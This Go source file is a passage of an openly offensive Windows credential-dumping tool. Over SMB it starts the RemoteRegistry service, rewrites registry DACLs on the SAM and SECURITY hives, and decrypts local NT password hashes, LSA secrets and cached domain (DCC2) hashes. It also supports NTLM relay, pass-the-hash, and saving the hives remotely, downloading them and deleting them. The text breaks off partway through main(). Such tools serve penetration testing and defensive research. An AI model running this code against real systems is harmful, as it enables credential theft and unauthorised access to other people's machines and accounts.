// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"bufio"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"os"
	"strings"
	"time"

	rundebug "runtime/debug"

	"golang.org/x/net/proxy"
	"golang.org/x/term"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/dcerpc"
	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
	"github.com/jfjallid/go-smb/smb/encoder"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/jfjallid/golog"
)

var log = golog.Get("")
var release string = "0.4.0"

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// Local Administrators group SID
var administratorsSID string = "S-1-5-32-544"

// List of all registry keys changed with the order recorded
var registryKeysModified []string

// Map with all original security descriptors
var m map[string]*msrrp.SecurityDescriptor

var samSecretList = []printableSecret{}
var lsaSecretList = []printableSecret{}
var dcc2SecretList = []printableSecret{}

var daclBackupFile *os.File
var outputFile *os.File

type printableSecret interface {
	printSecret(io.Writer)
}

type sam_account struct {
	name   string
	rid    uint32
	nthash string
}

func (self *sam_account) printSecret(out io.Writer) {
	if outputFile != nil {
		fmt.Fprintf(out, "%s:%d:%s\n", self.name, self.rid, self.nthash)
	} else {
		fmt.Fprintf(out, "Name: %s\n", self.name)
		fmt.Fprintf(out, "RID: %d\n", self.rid)
		fmt.Fprintf(out, "NT: %s\n\n", self.nthash)
	}
}

type dcc2_cache struct {
	domain string
	user   string
	cache  string
}

func (self *dcc2_cache) printSecret(out io.Writer) {
	fmt.Fprintln(out, self.cache)
}

func (self *printableLSASecret) printSecret(out io.Writer) {
	fmt.Fprintln(out, self.secretType)
	for _, item := range self.secrets {
		fmt.Fprintln(out, item)
	}
	if self.extraSecret != "" {
		fmt.Fprintln(out, self.extraSecret)
	}
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getRandString(n int) string {
	arr := make([]rune, n)
	for i := range arr {
		arr[i] = letters[rand.Intn(len(letters))]
	}
	return string(arr)
}

func isFlagSet(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func startRemoteRegistry(session *smb.Connection, share string) (started, disabled bool, err error) {
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	bind, err := dcerpc.Bind(f, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	serviceName := "RemoteRegistry"

	status, err := bind.GetServiceStatus(serviceName)
	if err != nil {
		log.Errorln(err)
		return
	} else {
		if status == dcerpc.ServiceRunning {
			started = true
			disabled = false
			return
		}
		// Check if disabled
		config, err := bind.GetServiceConfig(serviceName)
		if err != nil {
			log.Errorf("Failed to get config of %s service with error: %v\n", serviceName, err)
			return started, disabled, err
		}
		if config.StartType == dcerpc.StartTypeStatusMap[dcerpc.ServiceDisabled] {
			disabled = true
			// Enable service
			err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceNoChange, dcerpc.ServiceDemandStart, dcerpc.ServiceNoChange, "", "", "", "")
			if err != nil {
				log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
				return started, disabled, err
			}
		}
		// Start service
		err = bind.StartService(serviceName, nil)
		if err != nil {
			log.Errorln(err)
			return started, disabled, err
		}
		time.Sleep(time.Second)
	}
	return
}

func stopRemoteRegistry(session *smb.Connection, share string, disable bool) (err error) {
	log.Infoln("Trying to restore RemoteRegistry service status")
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	bind, err := dcerpc.Bind(f, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	serviceName := "RemoteRegistry"

	// Stop service
	err = bind.ControlService(serviceName, dcerpc.ServiceControlStop)
	if err != nil {
		log.Errorln(err)
		return
	}
	log.Infoln("Service RemoteRegistry stopped")

	if disable {
		err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceNoChange, dcerpc.ServiceDisabled, dcerpc.ServiceNoChange, "", "", "", "")
		if err != nil {
			log.Errorf("Failed to change service config to Disabled with error: %v\n", err)
			return
		}
		log.Infoln("Service RemoteRegistry disabled")
	}

	return
}

func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string) error {
	if m == nil {
		m = make(map[string]*msrrp.SecurityDescriptor)
	}

	for _, subkey := range keys {
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			if err == msrrp.ReturnCodeMap[msrrp.ErrorFileNotFound] {
				// Skip keys that do not exist
				continue
			}
			log.Errorln(err)
			return err
		}
		//Retrieving security settings
		sd, err := rpccon.GetKeySecurity(hSubKey)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			log.Errorln(err)
			return err
		}
		sdBytes, err := sd.MarshalBinary()
		if err != nil {
			log.Errorln(err)
			return err
		}

		sd2 := msrrp.SecurityDescriptor{
			OwnerSid: &msrrp.SID{},
			GroupSid: &msrrp.SID{},
			Sacl:     &msrrp.PACL{},
			Dacl:     &msrrp.PACL{},
		}
		err = sd2.UnmarshalBinary(sdBytes)
		if err != nil {
			log.Errorln(err)
			return err
		}
		// Check if key exists before adding to map.
		// Don't want to replace an existing key in case I change the ACL twice
		if _, ok := m[subkey]; !ok {
			m[subkey] = sd
			if daclBackupFile != nil {
				// Save new SD file
				sdBytes, err := encoder.Marshal(sd)
				if err != nil {
					log.Errorf("Failed to marshal SecurityDescriptor to bytes with error: %s\n", err)
				} else {
					sdHexBytes := hex.EncodeToString(sdBytes)
					_, err = daclBackupFile.WriteString(fmt.Sprintf("%s:%s\n", subkey, sdHexBytes))
					if err != nil {
						log.Errorf("Failed to write DACL to file with error: %s\n", err)
					}
				}
			}

		}

		mask := msrrp.PermWriteDacl | msrrp.PermReadControl | msrrp.PermKeyEnumerateSubKeys | msrrp.PermKeyQueryValue
		ace, err := msrrp.NewAce(sid, mask, msrrp.AccessAllowedAceType, msrrp.ContainerInheritAce)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(m, subkey)
			log.Errorln(err)
			return err
		}
		// NOTE Can't set owner, group or SACL, since I only have WriteDacl on SAM\SAM
		newSd, err := msrrp.NewSecurityDescriptor(sd.Control, nil, nil, msrrp.NewACL(append([]msrrp.ACE{*ace}, sd.Dacl.ACLS...)), nil)

		log.Infof("Changing Dacl for key: %s\n", subkey)
		err = rpccon.SetKeySecurity(hSubKey, newSd)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(m, subkey)
			log.Errorln(err)
			return err
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	return nil
}

func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string) error {
	if m == nil {
		err := fmt.Errorf("The map variable 'm' is not initialized which would indicate that no DACL was changed yet")
		log.Errorln(err)
		return err
	}

	var sd *msrrp.SecurityDescriptor
	var ok bool
	for _, subkey := range keys {
		if sd, ok = m[subkey]; !ok {
			log.Debugf("Trying to restore DACL of registry key %s, but the original DACL hasn't been saved.\nIt is likely that the registry key doesn't even exist\n", subkey)
			// Key did not exist so was not added to map
			continue
		}
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			log.Errorf("Tried to restore DACL of registry key %s, but failed to open registry key with error: %s\n", err)
			continue // Try to change as many keys as possible
		}

		sd.Control &^= msrrp.SecurityDescriptorFlagSP
		sd.OffsetSacl = 0
		sd.OwnerSid = nil
		sd.GroupSid = nil
		sd.OffsetOwner = 0
		sd.OffsetGroup = 0

		err = rpccon.SetKeySecurity(hSubKey, sd)
		if err != nil {
			log.Errorln(err)
			rpccon.CloseKeyHandle(hSubKey)
			continue
		}
		log.Infof("Reverted Dacl for key: %s\n", subkey)
		rpccon.CloseKeyHandle(hSubKey)
	}
	return nil
}

func restoreDaclFromBackup(rpccon *msrrp.RPCCon, hKey []byte) error {
	daclMap := make(map[string]*msrrp.SecurityDescriptor)
	keys := []string{}

	if daclBackupFile == nil {
		err := fmt.Errorf("Something went wrong with restoring DACLs from file. Backup file handle is nil")
		log.Errorln(err)
		return err
	}
	scanner := bufio.NewScanner(daclBackupFile)
	for scanner.Scan() {
		sd := msrrp.SecurityDescriptor{
			OwnerSid: &msrrp.SID{},
			GroupSid: &msrrp.SID{},
			Sacl:     &msrrp.PACL{},
			Dacl:     &msrrp.PACL{},
		}
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 2 {
			err := fmt.Errorf("Expected lines to be of the format 'regkey:hexstring', but failed to parse string")
			log.Errorln(err)
			return err
		}
		sdBytes, err := hex.DecodeString(parts[1])
		if err != nil {
			log.Errorf("Failed to hex decode security descriptor bytes with error: %s\n", err)
			return err
		}
		err = sd.UnmarshalBinary(sdBytes)
		if err != nil {
			log.Errorf("Failed to unmarshal security descriptor bytes with error: %s\n", err)
			return err
		}
		daclMap[parts[0]] = &sd
		keys = append(keys, parts[0])
	}
	if err := scanner.Err(); err != nil {
		log.Errorln(err)
		return err
	}

	m = daclMap

	return tryRollbackChanges(rpccon, hKey, keys)
}

func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string) error {
	log.Infoln("Attempting to restore security descriptors")
	// Rollback changes in reverse order
	for i, j := 0, len(keys)-1; i < j; i, j = i+1, j-1 {
		keys[i], keys[j] = keys[j], keys[i]
	}
	err := revertDacl(rpccon, hKey, keys)
	if err != nil {
		log.Errorln(err)
		return err
	}
	return nil
}

func addToListIfNotExit(list *[]string, keys []string) []string {
	newKeys := []string{}
OuterLoop:
	for _, key := range keys {
		for _, k := range *list {
			if key == k {
				continue OuterLoop
			}
		}
		// Key was not already added to the list
		newKeys = append(newKeys, key)
	}
	// Add only if they do not already exist
	*list = append(*list, newKeys...)
	return newKeys
}

func dumpSAM(rpccon *msrrp.RPCCon, hKey []byte) error {

	keys := []string{
		`SAM\SAM`,
		`SAM\SAM\Domains`,
		`SAM\SAM\Domains\Account`,
		`SAM\SAM\Domains\Account\Users`,
	}
	registryKeysModified = append(registryKeysModified, keys...)
	// Grant temporarily higher permissions to the local administrators group
	err := changeDacl(rpccon, hKey, keys, administratorsSID)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Get RIDs of local users
	keyUsers := `SAM\SAM\Domains\Account\Users`
	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
	if err != nil {
		log.Errorln(err)
		return err
	}

	rids = rids[:len(rids)-1]
	for i := range rids {
		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
	}

	// Extend the list of keys that have temporarily altered permissions
	registryKeysModified = append(registryKeysModified, rids...)
	// Grant temporarily higher permissions to the local administrators group
	err = changeDacl(rpccon, hKey, rids, administratorsSID)
	if err != nil {
		log.Errorln(err)
		return err
	}

	syskey, err := getSysKey(rpccon, hKey)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Gather credentials/secrets
	creds, err := getNTHash(rpccon, hKey, rids)
	if err != nil {
		log.Errorln(err)
		// Try to get other secrets instead of hard fail
	} else {
		//TODO Rewrite handling of creds to not print to stdout until the end
		// Would be nice to be able to choose writing output to file, or somewhere else
		for _, cred := range creds {
			acc := sam_account{name: cred.Username, rid: cred.RID}
			//fmt.Printf("Name: %s\n", cred.Username)
			//fmt.Printf("RID: %d\n", cred.RID)
			if len(cred.Data) == 0 {
				//fmt.Printf("NT: <empty>\n\n")
				acc.nthash = "<empty>"
				samSecretList = append(samSecretList, &acc)
				continue
			}
			var hash []byte
			if cred.AES {
				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
			} else {
				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
			}
			acc.nthash = fmt.Sprintf("%x", hash)
			samSecretList = append(samSecretList, &acc)
			//fmt.Printf("NT: %x\n\n", hash)
		}
	}

	return nil
}

func dumpLSASecrets(rpccon *msrrp.RPCCon, hKey []byte) error {
	keys := []string{
		`SECURITY\Policy\Secrets`,
		`SECURITY\Policy\Secrets\NL$KM`,
		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
		`SECURITY\Policy\PolEKList`,
		`SECURITY\Policy\PolSecretEncryptionKey`,
	}
	registryKeysModified = append(registryKeysModified, keys...)

	// Grant temporarily higher permissions to the local administrators group
	err := changeDacl(rpccon, hKey, keys, administratorsSID)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Get names of lsa secrets
	keySecrets := `SECURITY\Policy\Secrets`
	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
	if err != nil {
		log.Errorln(err)
		return err
	}

	newSecrets := make([]string, 0, len(secrets)*2)
	for i := range secrets {
		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
	}

	newKeys := addToListIfNotExit(&registryKeysModified, newSecrets)
	err = changeDacl(rpccon, hKey, newKeys, administratorsSID)
	if err != nil {
		log.Errorln(err)
		return err
	}

	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
	if err != nil {
		log.Noticeln("Failed to get lsa secrets")
		log.Errorln(err)
		return err
	}
	for i := range lsaSecrets {
		lsaSecretList = append(lsaSecretList, &lsaSecrets[i])
	}

	//if len(lsaSecrets) > 0 {
	//	fmt.Println("[*] LSA Secrets:")
	//	for _, secret := range lsaSecrets {
	//		fmt.Println(secret.secretType)
	//		for _, item := range secret.secrets {
	//			fmt.Println(item)
	//		}
	//		if secret.extraSecret != "" {
	//			fmt.Println(secret.extraSecret)
	//		}
	//	}
	//}

	return nil
}

func dumpDCC2Cache(rpccon *msrrp.RPCCon, hKey []byte) error {
	keys := []string{
		`SECURITY\Policy\Secrets`,
		`SECURITY\Policy\Secrets\NL$KM`,
		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
		`SECURITY\Policy\PolEKList`,
		`SECURITY\Policy\PolSecretEncryptionKey`,
		`SECURITY\Cache`,
	}
	newKeys := addToListIfNotExit(&registryKeysModified, keys)
	// Grant temporarily higher permissions to the local administrators group
	err := changeDacl(rpccon, hKey, newKeys, administratorsSID)
	if err != nil {
		log.Errorln(err)
		return err
	}

	cachedHashes, err := GetCachedHashes(rpccon, hKey)
	if err != nil {
		log.Errorln(err)
		return err
	}

	for _, hash := range cachedHashes {
		userdomain := strings.Split(hash, ":")[0]
		parts := strings.Split(userdomain, "/")
		dcc2SecretList = append(dcc2SecretList, &dcc2_cache{domain: parts[0], user: parts[1], cache: hash})
	}

	//if len(cachedHashes) > 0 {
	//	//fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
	//	for _, secret := range cachedHashes {
	//        userdomain := strings.Split(secret, ":")[0]
	//        parts := strings.Split(userdomain, "/")
	//        _ = dcc2_cache{
	//            domain: parts[0],
	//            user: parts[1],
	//            cache: secret,
	//        }
	//	}
	//}

	return nil
}

func downloadAndDeleteFile(session *smb.Connection, localFilename, remotePath string) (err error) {
	// Convert to valid remote path
	parts := strings.Split(remotePath, ":\\")
	if len(parts) > 1 {
		remotePath = parts[1]
	}

	f, err := os.OpenFile(localFilename, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0600)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.Close()

	// Call library function to retrieve the file
	log.Infof("Trying to download remote file C:\\%s\n", remotePath)
	err = session.RetrieveFile("C$", remotePath, 0, f.Write)
	if err != nil {
		log.Errorf("Failed to retrieve remote file C:\\%s with error: %s\n", remotePath, err)
	} else {
		log.Infof("Successfully downloaded %s\n", remotePath)
	}

	// Remove the remote files
	log.Infof("Trying to delete remote file C:\\%s\n", remotePath)
	err = session.DeleteFile("C$", remotePath)
	if err != nil {
		log.Errorf("Failed to delete remote file C:\\%s with error: %s\n", remotePath, err)
		return
	} else {
		log.Infof("Successfully deleted remote file C:\\%s\n", remotePath)
	}

	return
}

func dumpOffline(session *smb.Connection, rpccon *msrrp.RPCCon, hKey []byte, dst string) (err error) {

	log.Infoln("Attempting to dump SAM and SECURITY hives to disk and then retrieve the files for local parsing using some other tool")
	windowsPath := strings.ReplaceAll(dst, "/", "\\")
	// Ensure the path ends with a backslash
	if !strings.HasSuffix(windowsPath, "\\") {
		windowsPath += "\\"
	}
	samPath := windowsPath + getRandString(7) + ".log"
	securityPath := windowsPath + getRandString(7) + ".log"

	// Dump SAM
	// Open a key handle
	hSubKey, err := rpccon.OpenSubKey(hKey, "SAM")
	if err != nil {
		log.Errorln(err)
		return
	}
	err = rpccon.RegSaveKey(hSubKey, samPath, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	log.Infof("Dumped SAM hive to %s\n", samPath)

	// Retrieve the file
	err = downloadAndDeleteFile(session, "sam.dmp", samPath)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Dump SECURITY
	// Open a key handle
	hSubKey, err = rpccon.OpenSubKey(hKey, "SECURITY")
	if err != nil {
		log.Errorln(err)
		return
	}
	err = rpccon.RegSaveKey(hSubKey, securityPath, "")
	if err != nil {
		log.Errorln(err)
		rpccon.CloseKeyHandle(hSubKey)
		return
	}
	rpccon.CloseKeyHandle(hSubKey)
	log.Infof("Dumped SECURITY hive to %s\n", securityPath)

	// Retrieve the file
	err = downloadAndDeleteFile(session, "security.dmp", securityPath)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Dump the bootkey
	bootkey, err := getBootKey(rpccon, hKey)
	if err != nil {
		log.Errorf("Failed to extract the Bootkey from the SYSTEM hive with error: %s\n", err)
		return
	}

	fmt.Println("Downloaded SAM and SECURITY hives to local files sam.dmp and security.dmp")
	fmt.Printf("Bootkey for decrypting SAM and SECURITY hives: %x\n", bootkey)

	return nil
}

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host <target>       Hostname or ip address of remote server. Must be hostname when using Kerberos
      -P, --port <port>         SMB Port (default 445)
      -d, --domain <domain>     Domain name to use for login
      -u, --user <username>     Username
      -p, --pass <pass>         Password
      -n, --no-pass             Disable password prompt and send no credentials
          --hash <NT Hash>      Hex encoded NT Hash for user password
          --local               Authenticate as a local user instead of domain user
      -k, --kerberos            Use Kerberos authentication. (KRB5CCNAME will be checked on Linux)
          --dc-ip               Optionally specify ip of KDC when using Kerberos authentication
          --target-ip           Optionally specify ip of target when using Kerberos authentication
          --aes-key             Use a hex encoded AES128/256 key for Kerberos authentication
          --dump                Saves the SAM and SECURITY hives to disk and
                                transfers them to the local machine.
          --sam                 Extract secrets from the SAM hive explicitly. Only other explicit targets are included.
          --lsa                 Extract LSA secrets explicitly. Only other explicit targets are included.
          --dcc2                Extract DCC2 caches explicitly. Only ohter explicit targets are included.
          --backup-dacl         Save original DACLs to disk before modification
          --restore-dacl        Restore DACLs using disk backup. Could be useful if automated restore fails.
          --backup-file         Filename for DACL backup (default dacl.backup)
          --relay               Start an SMB listener that will relay incoming
                                NTLM authentications to the remote server and
                                use that connection. NOTE that this forces SMB 2.1
                                without encryption.
          --relay-port <port>   Listening port for relay (default 445)
          --socks-host <target> Establish connection via a SOCKS5 proxy server
          --socks-port <port>   SOCKS5 proxy port (default 1080)
      -t, --timeout             Dial timeout in seconds (default 5)
          --noenc               Disable smb encryption
          --smb2                Force smb 2.1
          --debug               Enable debug logging
          --verbose             Enable verbose logging
      -o, --output              Filename for writing results (default is stdout). Will append to file if it exists.
      -v, --version             Show version
`

func main() {
	var host, username, password, hash, domain, socksIP, backupFilename, outputFilename, targetIP, dcIP, aesKey string
	var port, dialTimeout, socksPort, relayPort int
	var debug, noEnc, forceSMB2, localUser, dump, version, verbose, relay, noPass, sam, lsaSecrets, dcc2, backupDacl, restoreDacl, kerberos bool
	var err error

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "")
	flag.StringVar(&username, "u", "", "")
	flag.StringVar(&username, "user", "", "")
	flag.StringVar(&password, "p", "", "")
	flag.StringVar(&password, "pass", "", "")
	flag.StringVar(&hash, "hash", "", "")
	flag.StringVar(&domain, "d", "", "")
	flag.StringVar(&domain, "domain", "", "")
	flag.IntVar(&port, "P", 445, "")
	flag.IntVar(&port, "port", 445, "")
	flag.BoolVar(&debug, "debug", false, "")
	flag.BoolVar(&verbose, "verbose", false, "")
	flag.BoolVar(&noEnc, "noenc", false, "")
	flag.BoolVar(&forceSMB2, "smb2", false, "")
	flag.BoolVar(&localUser, "local", false, "")
	flag.BoolVar(&dump, "dump", false, "")
	flag.IntVar(&dialTimeout, "t", 5, "")
	flag.IntVar(&dialTimeout, "timeout", 5, "")
	flag.BoolVar(&version, "v", false, "")
	flag.BoolVar(&version, "version", false, "")
	flag.BoolVar(&relay, "relay", false, "")
	flag.IntVar(&relayPort, "relay-port", 445, "")
	flag.StringVar(&socksIP, "socks-host", "", "")
	flag.IntVar(&socksPort, "socks-port", 1080, "")
	flag.BoolVar(&noPass, "no-pass", false, "")
	flag.BoolVar(&noPass, "n", false, "")
	flag.BoolVar(&sam, "sam", false, "")
	flag.BoolVar(&lsaSecrets, "lsa", false, "")
	flag.BoolVar(&dcc2, "dcc2", false, "")
	flag.BoolVar(&backupDacl, "backup-dacl", false, "")
	flag.BoolVar(&restoreDacl, "restore-dacl", false, "")
	flag.StringVar(&backupFilename, "backup-file", "dacl.backup", "")
	flag.StringVar(&outputFilename, "o", "", "")
	flag.StringVar(&outputFilename, "output", "", "")
	flag.BoolVar(&kerberos, "k", false, "")
	flag.BoolVar(&kerberos, "kerberos", false, "")
	flag.StringVar(&targetIP, "target-ip", "", "")
	flag.StringVar(&dcIP, "dc-ip", "", "")
	flag.StringVar(&aesKey, "aes-key", "", "")

	flag.Parse()

	if debug {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelDebug)
	} else if verbose {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelInfo)
	} else {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/spnego", "spnego", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/krb5ssp", "krb5ssp", golog.LevelNotice, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	if !sam && !lsaSecrets && !dcc2 {
		// If no individual target to dump is set, dump everything
		sam = true
		lsaSecrets = true
		dcc2 = true
	}

	if backupDacl && restoreDacl {
		log.Errorln("Can't specify both --backup-dacl and --restore-dacl at the same time.")
		flag.Usage()
		return
	}

	if backupDacl {
		daclBackupFile, err = os.OpenFile(backupFilename, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0600)
		if err != nil {
			log.Errorf("Failed to create local file %s to store original DACLs before modification with error: %s\n", backupFilename, err)
			return
		}
		defer daclBackupFile.Close()
	} else if restoreDacl {
		daclBackupFile, err = os.Open(backupFilename)
		if err != nil {
			log.Errorf("Failed to open local file %s to read original DACLs before restoring the ACLs with error: %s\n", backupFilename, err)
			return
		}
		defer daclBackupFile.Close()
	}

	if outputFilename != "" {
		outputFile, err = os.OpenFile(outputFilename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0600)
		if err != nil {
			log.Errorf("Failed to open local file %s for writing results with error: %s\n", outputFilename, err)
			return
		}
		defer outputFile.Close()
	}

	share := ""
	var hashBytes []byte
	var aesKeyBytes []byte

	if host == "" && targetIP == "" {
		log.Errorln("Must specify a hostname or ip")
		flag.Usage()
		return
	}
	if host != "" && targetIP == "" {
		targetIP = host
	} else if host == "" && targetIP != "" {
		host = targetIP
	}

	if socksIP != "" && isFlagSet("timeout") {
		log.Errorln("When a socks proxy is specified, --timeout is not supported")
		flag.Usage()
		return
	}

	if dialTimeout < 1 {
		log.Errorln("Valid value for the timeout is > 0 seconds")
		return
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			fmt.Println("Failed to decode hash")
			log.Errorln(err)
			return
		}
	}

	if aesKey != "" {
		aesKeyBytes, err = hex.DecodeString(aesKey)
		if err != nil {
			fmt.Println("Failed to decode aesKey")
			log.Errorln(err)
			return
		}
		if len(aesKeyBytes) != 16 && len(aesKeyBytes) != 32 {
			fmt.Println("Invalid keysize of AES Key")
			return
		}
	}

	if aesKey != "" && !kerberos {
		fmt.Println("Must use Kerberos auth (-k) when using --aes-key")
		flag.Usage()
	}

	if noPass {
		password = ""
		hashBytes = nil
		aesKeyBytes = nil
	} else {
		if (password == "") && (hashBytes == nil) && (aesKeyBytes == nil) {
			fmt.Printf("Enter password: ")
			passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
			fmt.Println()
			if err != nil {
				log.Errorln(err)
				return
			}
			password = string(passBytes)
		}
	}

	smbOptions := smb.Options{
		Host:              targetIP,
		Port:              port,
		DisableEncryption: noEnc,
		ForceSMB2:         forceSMB2,
		//DisableSigning: true,
	}

	if kerberos {
		smbOptions.Initiator = &spnego.KRB5Initiator{
			User:     username,
			Password: password,
			Domain:   domain,
			Hash:     hashBytes,
			AESKey:   aesKeyBytes,
			SPN:      "cifs/" + host,
			DCIP:     dcIP,
		}
	} else {
